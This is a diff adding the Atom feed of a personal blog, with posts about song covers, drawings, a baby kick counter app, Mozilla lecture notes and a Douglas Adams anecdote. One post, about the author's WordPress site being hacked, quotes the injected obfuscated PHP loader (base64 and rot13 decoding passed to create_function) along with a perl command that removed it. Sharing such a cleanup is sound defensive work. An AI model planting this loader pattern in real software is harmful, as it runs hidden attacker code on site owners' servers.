@@ -1,0 +1,519 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+<title type="text">GoldSounds</title>
+<generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
+<link rel="self" type="application/atom+xml" href="/feed.xml" />
+<link rel="alternate" type="text/html" href="" />
+<updated>2013-11-14T07:33:58-08:00</updated>
+<id>/</id>
+<author>
+  <name>Dan Walmsley</name>
+  <uri>/</uri>
+  <email>goldsounds@gmail.com</email>
+</author>
+
+
+<entry>
+  <title type="html"><![CDATA[Sea of Love]]></title>
+  <link>/songs/sea-of-love</link>
+  <id>/songs/sea-of-love</id>
+  <updated>2013-11-14T00:00:00-00:00</updated>
+  <published>2013-11-14T00:00:00-08:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;First mix of a Cat Power cover - just piano and voice. I remember seeing her at the Punter’s Club back in… was it 1996? A lifetime ago. I didn’t appreciate what I was experiencing at the time. She’s pretty cool.&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F120060855&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/sea-of-love&quot;&gt;Sea of Love&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on November 14, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Baby Kick Counter]]></title>
+  <link>/code/baby-kick-counter</link>
+  <id>/code/baby-kick-counter</id>
+  <updated>2013-10-15T00:00:00-00:00</updated>
+  <published>2013-10-15T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;This is a simple baby-kick counter for parents wanting to measure the movement of an unborn child.&lt;/p&gt;
+
+&lt;p&gt;It measures the time you take to click the “kick” button 10 times.&lt;/p&gt;
+
+&lt;p&gt;It stores each person’s data in an individual account.&lt;/p&gt;
+
+&lt;p&gt;View it live (here)[http://kickcounter.herokuapp.com]&lt;/p&gt;
+
+&lt;div class=&quot;github-widget&quot; data-repo=&quot;gravityrail/kickcounter&quot;&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/apps/kickcounter1.png&quot; width=&quot;200&quot; /&gt;
+&lt;img src=&quot;/images/apps/kickcounter2.png&quot; width=&quot;200&quot; /&gt;
+&lt;img src=&quot;/images/apps/kickcounter3.png&quot; width=&quot;200&quot; /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/code/baby-kick-counter&quot;&gt;Baby Kick Counter&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on October 15, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Please Don't Ask Me to Smile]]></title>
+  <link>/songs/please-don-t-ask-me-to-smile</link>
+  <id>/songs/please-don-t-ask-me-to-smile</id>
+  <updated>2013-09-23T00:00:00-00:00</updated>
+  <published>2013-09-23T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;This is one of my favourite songs by You Am I, a sweet ballad about a kid who just trying to figure out the rules.&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F109420603&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/please-don-t-ask-me-to-smile&quot;&gt;Please Don't Ask Me to Smile&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 23, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Golden Age]]></title>
+  <link>/songs/golden-age</link>
+  <id>/songs/golden-age</id>
+  <updated>2013-09-23T00:00:00-00:00</updated>
+  <published>2013-09-23T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;A quick-and-dirty cover with minimal instrumentation I made this afternoon. I’m experimenting a bit with harmonies. I have loved this song (by Beck, from Sea Change) since the first time I heard it at Doctor Dave’s house about 10 years ago.&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F111915916&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/golden-age&quot;&gt;Golden Age&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 23, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Anna Begins]]></title>
+  <link>/songs/anna-begins</link>
+  <id>/songs/anna-begins</id>
+  <updated>2013-09-23T00:00:00-00:00</updated>
+  <published>2013-09-23T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Cover of a really great song by Counting Crows from August and Everything After. In the early 90’s I was absolutely mad for these guys. Yes, I am absolutely showing my age.&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F109420576&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/anna-begins&quot;&gt;Anna Begins&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 23, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Madisonmite]]></title>
+  <link>/art/madisonmite</link>
+  <id>/art/madisonmite</id>
+  <updated>2013-09-10T00:00:00-00:00</updated>
+  <published>2013-09-10T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Made this to celebrate the marvellous merging of a wandering Australian, his Californian wife, and the wintery capital of Wisconsin.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/art/madisonmite&quot;&gt;Madisonmite&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 10, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Father's Day Portrait]]></title>
+  <link>/art/father-s-day-portrait</link>
+  <id>/art/father-s-day-portrait</id>
+  <updated>2013-09-10T00:00:00-00:00</updated>
+  <published>2013-09-10T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;I drew a picture of my Dad (traced from some photos) for Father’s Day, 2013.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/art/father-s-day-portrait&quot;&gt;Father's Day Portrait&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 10, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Dragon Momma]]></title>
+  <link>/art/dragon-momma</link>
+  <id>/art/dragon-momma</id>
+  <updated>2013-09-10T00:00:00-00:00</updated>
+  <published>2013-09-10T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;My mother in law is the sweetest person in the world, except perhaps for my wife. That’s what makes this so damn funny.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/art/dragon-momma&quot;&gt;Dragon Momma&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 10, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[American/Australian Gothic]]></title>
+  <link>/art/american-australian-gothic</link>
+  <id>/art/american-australian-gothic</id>
+  <updated>2013-09-10T00:00:00-00:00</updated>
+  <published>2013-09-10T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;I made this for our going away party when my wife and I moved from New York to Madison.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/art/american-australian-gothic&quot;&gt;American/Australian Gothic&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 10, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[American Apparel Girl]]></title>
+  <link>/songs/american-apparel-girl</link>
+  <id>/songs/american-apparel-girl</id>
+  <updated>2013-09-10T00:00:00-00:00</updated>
+  <published>2013-09-10T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;A song I felt compelled to write about the American Apparel billboards that blanket the inner east of Los Angeles.&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F109420544&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/american-apparel-girl&quot;&gt;American Apparel Girl&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 10, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Wild Horses]]></title>
+  <link>/songs/wild-horses</link>
+  <id>/songs/wild-horses</id>
+  <updated>2013-09-09T00:00:00-00:00</updated>
+  <published>2013-09-09T00:00:00-07:00</published>
+  
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;I recorded this song a few months ago. It was a second attempt after I tried to sing way too loud in the first. Turns out good microphones are sensitive, and good singers are supposed to know that :)&lt;/p&gt;
+
+&lt;p&gt;Also, that’s (Brent Strahan)[https://www.facebook.com/brent.strahan] guitar-soloing over the piano solo. International collaboration!&lt;/p&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;http://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F109420610&amp;amp;show_artwork=true&quot;&gt;&lt;/iframe&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/songs/wild-horses&quot;&gt;Wild Horses&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 09, 2013.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Irony overload as undecided voters criticise flip-flopper]]></title>
+  <link>/general/irony-overload-as-undecided-voters-criticise-flip-flopper</link>
+  <id>/general/irony-overload-as-undecided-voters-criticise-flip-flopper</id>
+  <published>2012-01-02T05:19:48-08:00</published>
+  <updated>2012-01-02T05:19:48-08:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Check out the buried lead in &lt;a href=&quot;http://www.reuters.com/article/2012/01/02/us-usa-campaign-idUSTRE7BT14220120102&quot;&gt;this article from Reuters&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;&quot;Romney just has to prove that he's conservative enough for me,&quot; said Eleanor Stump, a 70-year-old Tea Party member from Sheldon, Iowa. &quot;I don't like the way he's flip-flopped.&quot;
+
+Stump said she initially supported Herman Cain, who dropped out of the race after charges of an extramarital affair, then went to Perry, then back to Cain and then to Gingrich. &quot;I've gone back and forth so many times,&quot; she said.&lt;/blockquote&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/irony-overload-as-undecided-voters-criticise-flip-flopper&quot;&gt;Irony overload as undecided voters criticise flip-flopper&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on January 02, 2012.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Reminder: Pay ghostwriters better]]></title>
+  <link>/general/featured/reminder-pay-ghostwriters-better</link>
+  <id>/general/featured/reminder-pay-ghostwriters-better</id>
+  <published>2011-09-22T09:45:47-07:00</published>
+  <updated>2011-09-22T09:45:47-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;I bet @markdavison deletes these in a hurry.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/wp-content/uploads/2011/08/ghostwriter_fail.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-550&quot; title=&quot;ghostwriter_fail&quot; src=&quot;/wp-content/uploads/2011/08/ghostwriter_fail.png&quot; alt=&quot;&quot; width=&quot;534&quot; height=&quot;805&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/featured/reminder-pay-ghostwriters-better&quot;&gt;Reminder: Pay ghostwriters better&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on September 22, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[MoJo week 2: Adoption]]></title>
+  <link>/general/featured/mojo-week-2-adoption</link>
+  <id>/general/featured/mojo-week-2-adoption</id>
+  <published>2011-07-24T23:18:36-07:00</published>
+  <updated>2011-07-24T23:18:36-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;In this week’s MoJo lectures, we listened to &lt;a href=&quot;http://commonspace.wordpress.com/&quot;&gt;Mark Surman&lt;/a&gt; and &lt;a href=&quot;http://www.wait-till-i.com/&quot;&gt;Chris Heilmann&lt;/a&gt; of Mozilla talk about the new HTML5 standards and capabilities in the Firefox browser, and from &lt;a href=&quot;http://ejohn.org/&quot;&gt;John Resig&lt;/a&gt; on how to build and maintain an open source product.&lt;/p&gt;
+
+&lt;p&gt;The bridging concept between these two lectures is &lt;em&gt;adoption&lt;/em&gt;. It is the path from development to impact; the piece of the puzzle that enables a new tool or idea to enrich the lives of as many people as possible.&lt;/p&gt;
+
+&lt;p&gt;In Chris’ whirlwind (and hilarious) tour of the new HTML5 universe, he described what motivated him to embrace web standards in the first place. Standards can be seen as a constraint on innovation, but in Chris’ world they &lt;em&gt;enable&lt;/em&gt; innovation, particularly at the client. Thanks to libraries like &lt;a href=&quot;http://modernizr.com&quot;&gt;Modernizr&lt;/a&gt;, the &lt;a href=&quot;http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-section-element&quot;&gt;semantic&lt;/a&gt; &lt;a href=&quot;http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-article-element&quot;&gt;richness&lt;/a&gt; of &lt;a href=&quot;http://diveintohtml5.com&quot;&gt;HTML5&lt;/a&gt;Â and the ever-expanding breadth of clients, we are now able to deliver pages that look and behave &lt;em&gt;differently&lt;/em&gt;Â in each client. Not in ways that break standards, but in ways that leverage them. For example, using phone keypads for numeric form inputs, or the address book for email inputs.&lt;/p&gt;
+
+&lt;p&gt;Chris practices what he preaches. His easier &lt;a href=&quot;http://icant.co.uk/easy-youtube/&quot;&gt;YouTube interface for the learning disabled&lt;/a&gt;Â shows how web standards and API’s allow us to remix information and expand the audience for a piece of content. And, ultimately, expanding the audience for useful information seems to be Chris Heilmann’s core motivation, from his early days in radio to his current role as Developer Evangelist for Mozilla. Making things open and standards-based enables all of us to learn, and build on, how the web works.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://ejohn.org/&quot;&gt;John Resig&lt;/a&gt;Â is no stranger to how the web works. As the creator of &lt;a href=&quot;http://jquery.com&quot;&gt;JQuery&lt;/a&gt;Â and lead Javascript developer for online education pioneersÂ &lt;a href=&quot;http://www.khanacademy.org/&quot;&gt;Khan Academy&lt;/a&gt;, Resig knows how to build a community of support, whether for a software library or an actual library.&lt;/p&gt;
+
+&lt;p&gt;For the uninitiated, JQuery is the web’s most popular Javascript library - and not by chance. Resig spent years of his spare time enhancing JQuery and helping customers make the most of it, mostly by himself.&lt;/p&gt;
+
+&lt;p&gt;The success of JQuery, in the face of stiff competition from many other high-quality libraries like &lt;a href=&quot;http://mootools.net/&quot;&gt;MooTools&lt;/a&gt;, &lt;a href=&quot;http://www.prototypejs.org/&quot;&gt;Prototype&lt;/a&gt; and others, boils down to a few guiding principles (hint: they’re mostly non-technical):&lt;/p&gt;
+&lt;ul&gt;
+	&lt;li&gt;Great API design and code quality&lt;/li&gt;
+	&lt;li&gt;Extremely high quality documentation, FAQ, web site, tutorials&lt;/li&gt;
+	&lt;li&gt;Be responsive to requests from community members in email, IRC, newsgroups, message boards, ticketing systems, and anywhere else that conversations about your product occur&lt;/li&gt;
+	&lt;li&gt;Get the licensing right&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Treat every user as a potential future contributor&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The last part is key (which is why I’ve bolded it). Great open source projects live or die on the number of contributors working on the code - and nobody becomes a contributor to your project without first being a user. They will never make that leap without the knowledge that the leader of that project cares for them, so do everything you can to help people. You never know which ones will lead your project to widespread adoption.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/featured/mojo-week-2-adoption&quot;&gt;MoJo week 2: Adoption&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on July 24, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[The Power of Prototyping]]></title>
+  <link>/general/programming/articles/nerdy/featured/the-power-of-prototyping</link>
+  <id>/general/programming/articles/nerdy/featured/the-power-of-prototyping</id>
+  <published>2011-07-17T18:26:25-07:00</published>
+  <updated>2011-07-17T18:26:25-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;This is the first in what will be a series of blog posts for the Mozilla-Knight Journalism Challenge. This week we heard from &lt;a href=&quot;http://www.azarask.in/blog/&quot; target=&quot;_blank&quot;&gt;Aza Raskin&lt;/a&gt;, former creative lead for Firefox and head of user experience for &lt;a href=&quot;http://mozilla.com&quot; target=&quot;_blank&quot;&gt;Mozilla&lt;/a&gt;, talking about the power of prototyping for understanding problems and building momentum behind your solution.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://picasaweb.google.com/goldsounds/UnlockingVideo?authkey=Gv1sRgCP690om2p67vsAE&amp;amp;pli=1#5615321524278144370&quot;&gt;&lt;img class=&quot;size-medium wp-image-522&quot; title=&quot;mockup&quot; src=&quot;/wp-content/uploads/2011/07/mockup-273x300.jpg&quot; alt=&quot;&quot; width=&quot;273&quot; height=&quot;300&quot; align=&quot;center&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;As a programmer I often build &lt;a href=&quot;https://github.com/gravityrail&quot;&gt;throw-away apps&lt;/a&gt; in my spare time just to see how something works, explore a new API, or to discover new ways of solving old problems. However, in my professional life as a web developer, it’s easy to see building prototypes as a luxury. I’ve often had to fight for a budget that allows for scoping and prototyping, and even more often had to go without.&lt;/p&gt;
+
+&lt;p&gt;Raskin’s presentation, “&lt;a href=&quot;http://www.azarask.in/blog/post/how-to-prototype-and-influence-people/&quot;&gt;How to Prototype and Influence People&lt;/a&gt;”, explores the advantages of prototyping in ways that I hadn’t previously recognised. These insights can be grouped into two main areas:&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;em&gt;1. Developing a better understanding of the problem&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Trying several ways to solve a problem leads to a better solution, but can also lead to the recognition of a deeper problem on which the solution is dependent. Raskin used the tale of &lt;a href=&quot;http://en.wikipedia.org/wiki/Paul_MacCready&quot;&gt;Paul MacReady&lt;/a&gt;’s winning of the &lt;a href=&quot;http://en.wikipedia.org/wiki/Kremer_prize&quot;&gt;Kremer Prize&lt;/a&gt;Â for long-distance human-powered flightÂ as an example of this; MacReady’s key insight was that by dramatically reducing the time to repair and modify his aircraft, he could arrive at a winning design in a matter of months instead of decades. He was right. Failing fast through prototypingÂ led to rapid learning, which led to rapid improvement.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;em&gt;2. Building support for your idea or product&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Many entrepreneurs toil for years on products that are technically interesting without ever testing the interface on a live end-user. To an end-user a product is not an idea, nor a technology. &lt;strong&gt;To your customers, the product &lt;em&gt;is &lt;/em&gt;the interface.&lt;/strong&gt;By encouraging end-users to experience some aspect of a product’s interface you can observe their reaction to it and learn how to communicate the benefits more effectively. Putting the prototype in the hands of end-users keeps you focused on solving real-world problems.&lt;/p&gt;
+
+&lt;p&gt;As Aza put it:Â &lt;strong&gt;The value of an idea is zero unless it can be communicated&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Aza’s approach to prototyping is fast and pragmatic. He encourages creating the first prototype in a day.Â You’re should be creating a “visual sketch”, a space people can move through with their ideas. This allows them to see the solution for themselves, which is always more convincing than being told how great an idea is, or being dictated to by an over-wrought solution. Palm’s &lt;a href=&quot;http://en.wikipedia.org/wiki/Jeff_Hawkins&quot;&gt;Jeff Hawkins&lt;/a&gt; first prototyped their hand-held devices using blocks of wood - as lo-fi as it gets.&lt;/p&gt;
+
+&lt;p&gt;Aza began and ended the presentation with a quote from &lt;a href=&quot;http://en.wikipedia.org/wiki/Margaret_Mead&quot;&gt;Margaret Mead&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;Never doubt that a small group of committed people can change the world. Indeed, it's the only thing that ever has.&lt;/blockquote&gt;
+&lt;p&gt;If you’re a small team looking to change the world, then &lt;a href=&quot;http://www.azarask.in/blog/post/how-to-prototype-and-influence-people/&quot;&gt;recognising the power&lt;/a&gt; of rapid prototyping could give your idea a big boost.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/programming/articles/nerdy/featured/the-power-of-prototyping&quot;&gt;The Power of Prototyping&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on July 17, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[We're back]]></title>
+  <link>/general/featured/were-back</link>
+  <id>/general/featured/were-back</id>
+  <published>2011-07-11T14:19:46-07:00</published>
+  <updated>2011-07-11T14:19:46-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;So I totally got hacked. Reminder: be vigilant about upgrading wordpress and its plugins, or bad things happen.&lt;/p&gt;
+
+&lt;p&gt;The hack looks like this, and appears all over the place, at the top of some files and the bottom of others. It decodes a huge blob of encoded text that was stuffed into one of the wp-options values.&lt;/p&gt;
+&lt;blockquote&gt;get_option(\&quot;_transient_feed_98e8dbd04edf43b096e815a29343b006\&quot;); $z=base64_decode(str_rot13($z)); if(strpos($z,\&quot;0FE00707\&quot;)!==false){ $_z=create_function(\&quot;\&quot;,$z); @$_z(); }&lt;/blockquote&gt;
+&lt;p&gt;My first thought: “Oh crap, removing that text from hundreds of files? No thanks.”. Command line to the rescue! Thanks to Perl for still being awesome after all these years.&lt;/p&gt;
+&lt;blockquote&gt;find . -name &quot;*.php&quot; -exec perl -e 's/^.*_transient_feed_98e8dbd04edf43b096e815a29343b006.*$//g' -p -i {} \;&lt;/blockquote&gt;
+&lt;p&gt;If you’ve been struck by the same thing, just replace the _transient_feed with your own (the numbers probably change). These script-kiddy hackers are a perpetual annoyance. Hey kids - go build something awesome and useful instead of messing our web sites.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/featured/were-back&quot;&gt;We're back&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on July 11, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[One of my favourite stories ever]]></title>
+  <link>/general/one-of-my-favourite-stories-ever</link>
+  <id>/general/one-of-my-favourite-stories-ever</id>
+  <published>2011-02-26T16:19:47-08:00</published>
+  <updated>2011-02-26T16:19:47-08:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;As told by Douglas Adams a few years ago. I laugh every time I read this, and today I shared it with my wife for the first time and so felt compelled to share it with you, too.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;This actually did happen to a real person, and the real person is me. I had gone to catch a train. This was April 1976, in Cambridge, U.K. I was a bit early for the train. Iâ€™d gotten the time of the train wrong. I went to get myself a newspaper to do the crossword, and a cup of coffee and a packet of cookies. I went and sat at a table. I want you to picture the scene. Itâ€™s very important that you get this very clear in your mind. Hereâ€™s the table, newspaper, cup of coffee, packet of cookies. Thereâ€™s a guy sitting opposite me, perfectly ordinary-looking guy wearing a business suit, carrying a briefcase. It didnâ€™t look like he was going to do anything weird. What he did was this: he suddenly leaned across, picked up the packet of cookies, tore it open, took one out, and ate it.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;Now this, I have to say, is the sort of thing the British are very bad at dealing with. Thereâ€™s nothing in our background, upbringing, or education that teaches you how to deal with someone who in broad daylight has just stolen your cookies. You know what would happen if this had been South Central Los Angeles. There would have very quickly been gunfire, helicopters coming in, CNN, you knowâ€¦ But in the end, I did what any red-blooded Englishman would do: I ignored it. And I stared at the newspaper, took a sip of coffee, tried to do aclue in the newspaper, couldnâ€™t do anything, and thought, &lt;em&gt;What am I going to do?&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;In the end I thought &lt;em&gt;Nothing for it, Iâ€™ll just have to go for it&lt;/em&gt;, and I tried very hard not to notice the fact that the packet was already mysteriously opened. I took out a cookie for myself. I thought, &lt;em&gt;That settled him.&lt;/em&gt; But it hadnâ€™t because a moment or two later he did it again. He took another cookie. Having not mentioned it the first time, it was somehow even harder to raise the subject the second time around. â€œExcuse me, I couldnâ€™t help but noticeâ€¦â€ I mean, it doesnâ€™t really work.&lt;/p&gt;
+
+&lt;p&gt;We went through the whole packet like this. When I say the whole packet, I mean there were only about eight cookies, but it felt like a lifetime. He took one, I took one, he took one, I took one. Finally, when we got to the end, he stood up and walked away. Well, we exchanged meaningful looks, then he walked away, and I breathed a sigh of relief and sat back.&lt;/p&gt;
+
+&lt;p&gt;A moment or two later the train was coming in, so I tossed back the rest of my coffee, stood up, picked up the newspaper, and underneath the newspaper were my cookies. The thing I like particularly about this story is the sensation that somewhere in England there has been wandering around for the last quarter-century a perfectly ordinary guy whoâ€™s had the same exact story, only he doesnâ€™t have the punch line.&lt;/p&gt;
+
+&lt;p&gt;-Douglas Adams, &lt;em&gt;The Salmon of Doubt&lt;/em&gt;
+â€œCookiesâ€&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/one-of-my-favourite-stories-ever&quot;&gt;One of my favourite stories ever&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on February 26, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Why low taxes "benefit" the rich]]></title>
+  <link>/general/why-low-taxes-benefit-the-rich</link>
+  <id>/general/why-low-taxes-benefit-the-rich</id>
+  <published>2011-02-22T22:46:19-08:00</published>
+  <updated>2011-02-22T22:46:19-08:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Living in the US I hear a lot of heated rhetoric about taxes. While I’m not an economist, I do want to weigh in on what I see as a glaring logical flaw in how low taxes are supposed to benefit the little guy.&lt;/p&gt;
+
